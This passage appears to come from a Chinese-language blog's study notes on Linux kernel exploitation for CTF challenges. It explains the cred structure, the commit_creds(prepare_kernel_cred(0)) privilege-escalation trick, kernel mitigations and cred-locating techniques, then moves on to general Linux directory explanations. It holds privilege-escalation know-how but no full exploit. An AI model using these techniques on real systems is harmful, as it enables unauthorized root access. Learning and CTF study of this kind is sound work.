class="keyword">struct</span> <span class="title">key</span>  *<span class="title">request_key_auth</span>;</span> <span class="comment">/* assumed request_key authority */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">    <span class="type">void</span>        *security;  <span class="comment">/* subjective LSM security */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_struct</span> *<span class="title">user</span>;</span>   <span class="comment">/* real user ID subscription */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">user_namespace</span> *<span class="title">user_ns</span>;</span> <span class="comment">/* user_ns the caps and keyrings are relative to. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group_info</span> *<span class="title">group_info</span>;</span>  <span class="comment">/* supplementary groups for euid/fsgid */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> <span class="title">rcu</span>;</span>        <span class="comment">/* RCU deletion hook */</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="内核态函数"><a href="#内核态函数" class="headerlink" title="内核态函数"></a>内核态函数</h2><p>相比用户态库函数，内核态的函数有了一些变化</p><ul><li><p>printf() -&gt; **printk()**，但需要注意的是 printk() 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</p></li><li><p>memcpy() -&gt;</p><p>copy_from_user()&#x2F;copy_to_user()</p><ul><li>copy_from_user() 实现了将用户空间的数据传送到内核空间</li><li>copy_to_user() 实现了将内核空间的数据传送到用户空间</li></ul></li><li><p>malloc() -&gt; **kmalloc()**，内核态的内存分配函数，和 malloc() 相似，但使用的是 <code>slab/slub 分配器</code></p></li><li><p>free() -&gt; **kfree()**，同 kmalloc()</p></li></ul><p>另外要注意的是，<code>kernel 管理进程，因此 kernel 也记录了进程的权限</code>。kernel 中有两个可以方便的改变权限的函数：</p><ul><li><strong>int commit_creds(struct cred *new)</strong></li><li><strong>struct cred* prepare_kernel_cred(struct task_struct* daemon)</strong></li></ul><p>从函数名也可以看出，执行 <code>commit_creds(prepare_kernel_cred(0))</code> 即可获得 root 权限，0 表示 以 0 号进程作为参考准备新的 credentials。</p><blockquote><p>更多关于 <code>prepare_kernel_cred</code> 的信息可以参考 <a href="https://elixir.bootlin.com/linux/v4.6/source/kernel/cred.c#L594">源码</a></p></blockquote><p>执行 <code>commit_creds(prepare_kernel_cred(0))</code> 也是最常用的提权手段，两个函数的地址都可以在 <code>/proc/kallsyms</code> 中查看（较老的内核版本中是 <code>/proc/ksyms</code>）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">post sudo grep commit_creds /proc/kallsyms </span><br><span class="line">[sudo] m4x 的密码：</span><br><span class="line">ffffffffbb6af9e0 T commit_creds</span><br><span class="line">ffffffffbc7cb3d0 r __ksymtab_commit_creds</span><br><span class="line">ffffffffbc7f06fe r __kstrtab_commit_creds</span><br><span class="line">post sudo grep prepare_kernel_cred /proc/kallsyms</span><br><span class="line">ffffffffbb6afd90 T prepare_kernel_cred</span><br><span class="line">ffffffffbc7d4f20 r __ksymtab_prepare_kernel_cred</span><br><span class="line">ffffffffbc7f06b7 r __kstrtab_prepare_kernel_cred</span><br></pre></td></tr></table></figure><blockquote><p>一般情况下，&#x2F;proc&#x2F;kallsyms 的内容需要 root 权限才能查看</p></blockquote><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><blockquote><p>canary, dep, PIE, RELRO 等保护与用户态原理和作用相同</p></blockquote><ul><li>smep: Supervisor Mode Execution Protection，当处理器处于 <code>ring0</code> 模式，执行 <code>用户空间</code> 的代码会触发页错误。（在 arm 中该保护称为 <code>PXN</code>）</li><li>smap: Superivisor Mode Access Protection，类似于 smep，通常是在访问数据时。</li><li>mmap_min_addr:是一个内核参数，用于限制用户空间可以使用的最低内存地址。</li></ul><h2 id="CTF-kernel-pwn-相关"><a href="#CTF-kernel-pwn-相关" class="headerlink" title="CTF kernel pwn 相关"></a>CTF kernel pwn 相关</h2><p>一般会给以下三个文件</p><ol><li><p>boot.sh: 一个用于启动 kernel 的 shell 的脚本，多用 qemu，保护措施与 qemu 不同的启动参数有关</p></li><li><p>bzImage: kernel binary</p></li><li><p>rootfs.cpio: 文件系统映像</p><p>比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">CISCN2017_babydriver [master●] ls</span><br><span class="line">babydriver.tar</span><br><span class="line">CISCN2017_babydriver [master●] x babydriver.tar</span><br><span class="line">boot.sh</span><br><span class="line">bzImage</span><br><span class="line">rootfs.cpio</span><br><span class="line">CISCN2017_babydriver [master●] ls</span><br><span class="line">babydriver.tar  boot.sh  bzImage  rootfs.cpio</span><br><span class="line">CISCN2017_babydriver [master●] file bzImage</span><br><span class="line">bzImage: Linux kernel x86 boot executable bzImage, version <span class="number">4.4</span><span class="number">.72</span> (atum@ubuntu) #<span class="number">1</span> SMP Thu Jun <span class="number">15</span> <span class="number">19</span>:<span class="number">52</span>:<span class="number">50</span> PDT <span class="number">2017</span>, RO-rootFS, swap_dev <span class="number">0x6</span>, Normal VGA</span><br><span class="line">CISCN2017_babydriver [master●] file rootfs.cpio</span><br><span class="line">rootfs.cpio: gzip compressed data, last modified: Tue Jul  <span class="number">4</span> <span class="number">08</span>:<span class="number">39</span>:<span class="number">15</span> <span class="number">2017</span>, max compression, from Unix, original size <span class="number">2844672</span></span><br><span class="line">CISCN2017_babydriver [master●] file boot.sh</span><br><span class="line">boot.sh: Bourne-Again shell script, ASCII text executable</span><br><span class="line">CISCN2017_babydriver [master●] bat boot.sh </span><br><span class="line">───────┬─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">       │ File: boot.sh</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">1</span>   │ #!/bin/bash</span><br><span class="line">   <span class="number">2</span>   │ </span><br><span class="line">   <span class="number">3</span>   │ qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 ro</span></span><br><span class="line"><span class="string">       │ ot=/dev/ram oops=panic panic=1&#x27;</span> -enable-kvm -monitor /dev/null -m <span class="number">64</span>M --nographi</span><br><span class="line">       │ c  -smp cores=<span class="number">1</span>,threads=<span class="number">1</span> -cpu kvm64,+smep</span><br><span class="line">───────┴─────────────────────────────────────────────────────────────────────────────────</span><br></pre></td></tr></table></figure><p>解释一下 qemu 启动的参数：</p><ul><li>-initrd rootfs.cpio，使用 rootfs.cpio 作为内核启动的文件系统</li><li>-kernel bzImage，使用 bzImage 作为 kernel 映像</li><li>-cpu kvm64,+smep，设置 CPU 的安全选项，这里开启了 smep</li><li>-m 64M，设置虚拟 RAM 为 64M，默认为 128M 其他的选项可以通过 –help 查看。</li></ul></li><li><p>本地写好 exploit 后，可以通过 base64 编码等方式把编译好的二进制文件保存到远程目录下，进而拿到 flag。同时可以使用 musl, uclibc 等方法减小 exploit 的体积方便传输。</p></li></ol><p>在 Linux 内核漏洞利用中，攻击者可能会有以下几个目的</p><ul><li>提权，即获取到 root 权限。</li><li>泄露敏感信息。</li><li>DoS，即使得内核崩溃。</li></ul><p><strong>一般而言，攻击者的主要目的是提权。</strong></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>内核提权指的是普通用户可以获取到 root 用户的权限，访问原先受限的资源。这里从两种角度来考虑如何提权</p><ul><li>改变自身：通过改变自身进程的权限，使其具有 root 权限。</li><li>改变别人：通过影响高权限进程的执行，使其完成我们想要的功能。</li></ul><h2 id="Change-Self"><a href="#Change-Self" class="headerlink" title="Change Self"></a>Change Self</h2><p>内核会通过进程的 <code>task_struct</code> 结构体中的 cred 指针来索引 cred 结构体，然后根据 cred 的内容来判断一个进程拥有的权限，如果 cred 结构体成员中的 uid-fsgid 都为 0，那一般就会认为进程具有 root 权限。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此，思路就比较直观了，我们可以通过以下方式来提权</p><ul><li>直接修改 cred 结构体的内容</li><li>修改 task_struct 结构体中的 cred 指针指向一个满足要求的 cred</li></ul><p>无论是哪一种方法，一般都分为两步：定位，修改。这就好比把大象放到冰箱里一样。</p><h2 id="直接改-cred"><a href="#直接改-cred" class="headerlink" title="直接改 cred"></a>直接改 cred</h2><h3 id="定位具体位置"><a href="#定位具体位置" class="headerlink" title="定位具体位置"></a>定位具体位置</h3><p>我们可以首先获取到 cred 的具体地址，然后修改 cred。</p><h4 id="定位"><a href="#定位" class="headerlink" title="定位"></a>定位</h4><p>定位 cred 的具体地址有很多种方法，这里根据是否直接定位分为以下两种</p><h5 id="直接定位"><a href="#直接定位" class="headerlink" title="直接定位"></a>直接定位</h5><p>cred 结构体的最前面记录了各种 id 信息，对于一个普通的进程而言，uid-fsgid 都是执行进程的用户的身份。因此我们可以通过扫描内存来定位 cred。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cred</span> &#123;</span></span><br><span class="line">    <span class="type">atomic_t</span>    usage;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_CREDENTIALS</span></span><br><span class="line">    <span class="type">atomic_t</span>    subscribers;    <span class="comment">/* number of processes subscribed */</span></span><br><span class="line">    <span class="type">void</span>        *put_addr;</span><br><span class="line">    <span class="type">unsigned</span>    magic;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC  0x43736564</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> CRED_MAGIC_DEAD 0x44656144</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">kuid_t</span>      uid;        <span class="comment">/* real UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      gid;        <span class="comment">/* real GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      suid;       <span class="comment">/* saved UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      sgid;       <span class="comment">/* saved GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      euid;       <span class="comment">/* effective UID of the task */</span></span><br><span class="line">    <span class="type">kgid_t</span>      egid;       <span class="comment">/* effective GID of the task */</span></span><br><span class="line">    <span class="type">kuid_t</span>      fsuid;      <span class="comment">/* UID for VFS ops */</span></span><br><span class="line">    <span class="type">kgid_t</span>      fsgid;      <span class="comment">/* GID for VFS ops */</span></span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在实际定位的过程中，我们可能会发现很多满足要求的 cred，这主要是因为 cred 结构体可能会被拷贝、释放。</strong>一个很直观的想法是在定位的过程中，<strong>利用 usage 不为 0 来筛除掉一些 cred</strong>，但仍然会发现一些 usage 为 0 的 cred。这是因为 cred 从 usage 为 0， 到释放有一定的时间。此外，cred 是使用 rcu 延迟释放的。</p><blockquote><p>usage字段是cred结构体中的一个计数器，用于记录对该cred结构体的引用数。每当有一个进程引用该cred结构体时，usage计数就会增加；当引用结束时，计数就会减少。这个计数机制被用于管理cred结构体的生命周期和内存释放。</p><p>具体来说，usage的作用有以下几个方面：</p><ol><li>引用计数：usage字段用于跟踪cred结构体的引用次数。通过增加和减少usage计数，内核可以确定何时可以安全地释放cred结构体的内存。</li><li>延迟释放：cred结构体的释放是通过RCU（Read-Copy-Update）机制来延迟执行的。当usage计数减少到0时，并不立即释放cred结构体的内存，而是延迟到合适的时机，以确保没有正在使用该cred结构体的代码存在。</li><li>进程共享：由于cred结构体可以被多个进程引用，通过共享同一个cred结构体，可以节省内存和提高性能。usage计数的增加和减少反映了cred结构体的引用情况，确保在没有进程引用时才释放相关的资源。</li></ol><p>在定位cred结构体的过程中，通过检查usage字段可以了解当前有多少进程正在引用该cred结构体。如果发现usage为0，表示当前没有进程引用该cred结构体，可能可以安全地释放它。但需要注意的是，由于RCU的延迟释放机制，即使usage为0，cred结构体的内存也可能不会立即释放，而是会在合适的时机进行释放。</p></blockquote><h5 id="间接定位"><a href="#间接定位" class="headerlink" title="间接定位"></a>间接定位</h5><h6 id="task-struct"><a href="#task-struct" class="headerlink" title="task_struct"></a>task_struct</h6><p>进程的 <code>task_struct</code> 结构体中会存放指向 cred 的指针，因此我们可以</p><ol><li>定位当前进程 <code>task_struct</code> 结构体的地址</li><li>根据 cred 指针相对于 task_struct 结构体的偏移计算得出 <code>cred</code> 指针存储的地址</li><li>获取 <code>cred</code> 具体的地址</li></ol><h6 id="comm"><a href="#comm" class="headerlink" title="comm"></a>comm</h6><p>comm 用来标记可执行文件的名字，位于进程的 <code>task_struct</code> 结构体中。我们可以发现 comm 其实在 cred 的正下方，所以我们也可以先定位 comm ，然后定位 cred 的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">/* Process credentials: */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Tracer&#x27;s credentials at attach: */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">ptracer_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Objective and real subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">real_cred</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Effective (overridable) subjective task credentials (COW): */</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span>     *<span class="title">cred</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KEYS</span></span><br><span class="line">    <span class="comment">/* Cached requested key. */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">key</span>          *<span class="title">cached_requested_key</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * executable name, excluding path.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * - normally initialized setup_new_exec()</span></span><br><span class="line"><span class="comment">     * - access it with [gs]et_task_comm()</span></span><br><span class="line"><span class="comment">     * - lock it with task_lock()</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span>                comm[TASK_COMM_LEN];</span><br></pre></td></tr></table></figure><p>然而，在进程名字并不特殊的情况下，内核中可能会有多个同样的字符串，这会影响搜索的正确性与效率。因此，我们可以使用 prctl 设置进程的 comm 为一个特殊的字符串，然后再开始定位 comm。</p><blockquote><p>在Linux系统中，prctl（Process Control）是一个系统调用，用于控制和修改进程的各种属性和行为。通过prctl系统调用，可以对进程进行各种操作，如设置进程的名称、获取和修改进程的资源限制、修改进程的信号处理方式等。</p><p>具体来说，prctl系统调用的功能包括但不限于以下几个方面：</p><ol><li>进程名称（comm）的设置：可以使用prctl系统调用来设置进程的名称。进程名称是在进程表中标识进程的一个字符串。通过设置特殊的进程名称，可以在定位和识别进程时提供更多的信息。</li><li>进程资源限制的获取和修改：可以使用prctl系统调用来获取和修改进程的资源限制，如CPU时间限制、内存限制、文件描述符限制等。这可以帮助控制进程的资源使用情况，以及保护系统免受恶意进程的影响。</li><li>进程信号处理方式的修改：可以使用prctl系统调用来修改进程接收和处理信号的方式。可以设置进程忽略某些信号、捕获和处理某些信号，或者恢复默认的信号处理方式。</li><li>进程状态的获取和修改：可以使用prctl系统调用来获取和修改进程的状态信息，如进程的运行状态、终止状态等。这可以用于监控和管理进程的状态。</li><li>其他进程控制操作：prctl系统调用还提供其他一些进程控制操作，如设置线程名字、获取和修改进程的调度策略和优先级、获取和修改进程的安全上下文等。</li></ol><p>通过使用prctl系统调用，可以对进程进行灵活的控制和管理，以满足特定的需求和场景。在定位进程时，可以使用prctl设置进程的名称（comm）为特殊的字符串，以便更方便地进行搜索和识别。</p></blockquote><h4 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h4><p>在这种方法下，我们可以直接将 cred 中的 uid-fsgid 都修改为 0。当然修改的方式有很多种，比如说</p><ul><li>在我们具有任意地址读写后，可以直接修改 cred。</li><li>在我们可以 ROP 执行代码后，可以利用 ROP gadget 修改 cred。</li></ul><h3 id="间接定位-1"><a href="#间接定位-1" class="headerlink" title="间接定位"></a>间接定位</h3><p>虽然我们确实想要修改 cred 的内容，但是不一定非得知道 cred 的具体位置，我们只需要能够修改 cred 即可。</p><h4 id="（已过时）UAF-使用同样堆块"><a href="#（已过时）UAF-使用同样堆块" class="headerlink" title="（已过时）UAF 使用同样堆块"></a>（已过时）UAF 使用同样堆块</h4><p>如果我们在进程初始化时能控制 cred 结构体的位置，并且我们可以在初始化后修改该部分的内容，那么我们就可以很容易地达到提权的目的。这里给出一个典型的例子</p><ol><li>申请一块与 cred 结构体大小一样的堆块</li><li>释放该堆块</li><li>fork 出新进程，恰好使用刚刚释放的堆块</li><li>此时，修改 cred 结构体特定内存，从而提权</li></ol><p>但是<strong>此种方法在较新版本内核中已不再可行，我们已无法直接分配到 cred_jar 中的 object</strong>，这是因为 cred_jar 在创建时设置了 <code>SLAB_ACCOUNT</code> 标记，在 <code>CONFIG_MEMCG_KMEM=y</code> 时（默认开启）<strong>cred_jar 不会再与相同大小的 kmalloc-192 进行合并</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __init <span class="title function_">cred_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* allocate a slab in which we can store credentials */</span></span><br><span class="line">    cred_jar = kmem_cache_create(<span class="string">&quot;cred_jar&quot;</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> cred), <span class="number">0</span>,</span><br><span class="line">            SLAB_HWCACHE_ALIGN|SLAB_PANIC|SLAB_ACCOUNT, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="内核的文件系统"><a href="#内核的文件系统" class="headerlink" title="内核的文件系统"></a>内核的文件系统</h1><h2 id="dev文件"><a href="#dev文件" class="headerlink" title="dev文件"></a>dev文件</h2><p>在Linux系统中，<code>/dev</code>目录是一个特殊的目录，用于表示<strong>设备文件</strong>。设备文件是用于<strong>与系统中的硬件设备或其他特殊设备进行交互的接口</strong>。<code>/dev</code>目录中的文件对应着系统中的各种设备，包括磁盘驱动器、串口、打印机等。</p><p>下面是一些常见的<code>/dev</code>目录中的设备文件及其含义：</p><ol><li><code>/dev/null</code>：一个特殊的设备文件，用于丢弃所有写入它的数据。读取它将立即返回文件结束。</li><li><code>/dev/zero</code>：一个特殊的设备文件，用于提供无限的零字节数据。读取它将返回连续的零字节。</li><li><code>/dev/random</code>和<code>/dev/urandom</code>：这些设备文件用于<strong>生成随机数</strong>据。<code>/dev/random</code>提供高质量的随机数据，但当熵池耗尽时会阻塞读取操作。<code>/dev/urandom</code>则不会阻塞，但在熵池耗尽时可能提供较低质量的随机数据。</li><li><code>/dev/tty</code>：<strong>代表当前终端设备的设备文件</strong>。它通常用于与终端进行交互，例如读取键盘输入或向终端输出数据。</li><li><code>/dev/sda</code>、<code>/dev/sdb</code>等：这些设备文件表示系统中的物理磁盘驱动器。每个磁盘驱动器都被分配一个相应的设备文件，用于进行磁盘操作，如读取和写入数据。</li><li><code>/dev/input/eventX</code>：这些设备文件表示输入设备，如键盘、鼠标和触摸屏。每个输入设备都被分配一个对应的设备文件，用于读取设备的输入事件。</li><li><code>/dev/videoX</code>：这些设备文件代表视频设备，如摄像头。每个视频设备都被分配一个对应的设备文件，用于捕获视频数据。</li></ol><h2 id="bin文件"><a href="#bin文件" class="headerlink" title="bin文件"></a>bin文件</h2><p>在计算机领域中，”bin”一词通常是指二进制文件（Binary file）。二进制文件是一种以二进制形式存储的文件，其中包含计算机可执行代码或非文本数据。</p><p>二进制文件与文本文件不同，它们不是使用可读的字符编码（如ASCII或UTF-8）表示的文本数据，而是以机器可执行的二进制形式存储的数据。二进制文件可以包含编译后的程序代码、可执行文件、库文件、图像、音频、视频等各种非文本数据。</p><p>二进制文件通常由编译器、链接器或其他工具生成，用于在计算机上执行特定的操作。例如，可执行文件（executable file）是一种特殊的二进制文件，包含了计算机可直接执行的指令和数据，用于运行程序。库文件（library file）是包含可重用代码和函数的二进制文件，用于在程序开发中进行链接和共享。</p><p>二进制文件的内容对于人类来说通常是不可读的，因为它们不是使用文本编码表示的。要查看二进制文件的内容，通常需要使用特定的工具或程序进行解析和处理。</p><p>总结起来，”bin”文件是指二进制文件，其中包含了以二进制形式存储的计算机可执行代码或非文本数据。它们在计算机系统中起着重要的作用，用于存储和执行各种类型的程序和数据。</p><h2 id="etc文件"><a href="#etc文件" class="headerlink" title="etc文件"></a>etc文件</h2><p>在类Unix操作系统中，<code>/etc</code>目录是一个非常重要的目录，它用于存放系统的配置文件。这个目录包含了系统大部分的配置文件和子目录。我们可以将其视为系统的“设置中心”。下面是一些<code>/etc</code>目录下常见的文件和子目录的中文详解：</p><ol><li>**<code>/etc/passwd</code>**：这是一个用户账户信息文件，记录了系统上每个用户的基本信息，例如用户ID、组ID、家目录、登录shell等。虽然这个文件包含密码信息的位置，但现代系统中密码通常是加密后存储在<code>/etc/shadow</code>中。</li><li>**<code>/etc/shadow</code>**：存储加密后的用户密码以及与密码相关的管理信息，如密码更改日期、过期时间等。出于安全考虑，这个文件的读权限非常严格，通常只有超级用户（root）可以访问。</li><li>**<code>/etc/group</code>**：类似于<code>/etc/passwd</code>，但这个文件记录的是组的信息，包括组名、组密码（很少使用）、组ID以及属于该组的用户列表。</li><li>**<code>/etc/fstab</code>**：文件系统表，这个文件包含了系统启动时需要挂载的分区和存储设备的信息，包括设备名、挂载点、文件系统类型、挂载选项等。</li><li>**<code>/etc/hosts</code>**：这是一个本地DNS解析文件，用于将主机名映射到IP地址。在进行DNS查询之前，系统会首先检查这个文件。</li><li>**<code>/etc/resolv.conf</code>**：DNS客户端的配置文件，指定了系统解析域名时应该查询的DNS服务器的IP地址。</li><li>**<code>/etc/sysctl.conf</code>**：用于配置内核参数的文件。系统管理员可以通过编辑这个文件来调整和优化系统的运行参数。</li><li>**<code>/etc/crontab</code>**：系统定时任务配置文件，允许系统管理员安排在特定时间自动执行的任务。</li><li>**<code>/etc/services</code>**：这个文件列出了网络服务和对应的端口号，例如HTTP通常对应端口80。这有助于软件和服务找到它们应该使用的标准端口。</li><li>**<code>/etc/network/interfaces</code>**（在一些系统中）：网络接口配置文件，用于设置网络接口的IP地址、子网掩码、网关等网络参数。</li></ol><p>这只是<code>/etc</code>目录下一小部分文件和目录的简介。<code>/etc</code>目录下的文件和子目录数量众多，且随着不同的发行版和系统配置的不同而有所变化。管理员和高级用户通常需要根据具体需求编辑这些文件来配置系统。</p><h2 id="home文件"><a href="#home文件" class="headerlink" title="home文件"></a>home文件</h2><p>在类Unix操作系统中，<code>/home</code>目录扮演着非常重要的角色，它是用户的个人目录的默认存放位置。每个在系统上有账户的普通用户都会在<code>/home</code>目录下拥有一个与其用户名同名的目录，用来存储个人文件、配置文件、用户级的程序设置等。以下是对<code>/home</code>目录的详细解释：</p><h3 id="home目录的作用"><a href="#home目录的作用" class="headerlink" title="/home目录的作用"></a><code>/home</code>目录的作用</h3><ul><li><strong>用户数据存储</strong>：用户可以在自己的<code>/home</code>子目录中存储个人文件、文档、图片、音乐等数据。</li><li><strong>用户配置文件</strong>：很多程序会在用户的<code>/home</code>子目录中创建隐藏文件或目录（文件或目录名以<code>.</code>开头）来存储程序的用户级配置。例如，浏览器可能会在用户的<code>/home</code>子目录下创建一个隐藏的配置目录来存储书签和历史记录。</li><li><strong>用户级软件安装</strong>：用户可以在自己的<code>/home</code>目录下安装软件或脚本，这些软件或脚本只对当前用户有效，不影响系统中的其他用户。</li></ul><h3 id="home目录的特点"><a href="#home目录的特点" class="headerlink" title="/home目录的特点"></a><code>/home</code>目录的特点</h3><ul><li><strong>隔离性</strong>：每个用户的<code>/home</code>子目录是独立的，这意味着一个用户默认情况下无法访问另一个用户的<code>/home</code>子目录。这提供了一定程度的数据隔离和隐私保护。</li><li><strong>备份与迁移</strong>：由于用户的个人数据和配置都存储在<code>/home</code>目录下，这使得备份和迁移用户数据变得相对简单。系统管理员可以通过备份整个<code>/home</code>目录来备份所有用户的个人数据。</li><li><strong>灵活性</strong>：如果系统需要重新安装或升级，通常不需要对<code>/home</code>目录进行更改，这意味着用户的个人设置和数据可以在系统升级或重装后保持不变。</li></ul><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>存储空间管理</strong>：在有限的磁盘空间情况下，<code>/home</code>目录可能会成为存储空间不足的瓶颈。因此，管理好<code>/home</code>目录下的存储空间使用情况是很重要的。</li><li><strong>安全性</strong>：虽然<code>/home</code>目录提供了用户数据的隔离，但是如果系统的安全设置不当，恶意用户或程序仍然有可能访问或修改其他用户的数据。因此，保持系统的安全更新和合理配置权限是非常重要的。</li></ul><p>总的来说，<code>/home</code>目录是类Unix操作系统中非常关键的一个组成部分，它为用户提供了一个存储个人数据和配置的空间，同时也带来了一系列的管理和安全上的考虑。</p><h2 id="lib文件"><a href="#lib文件" class="headerlink" 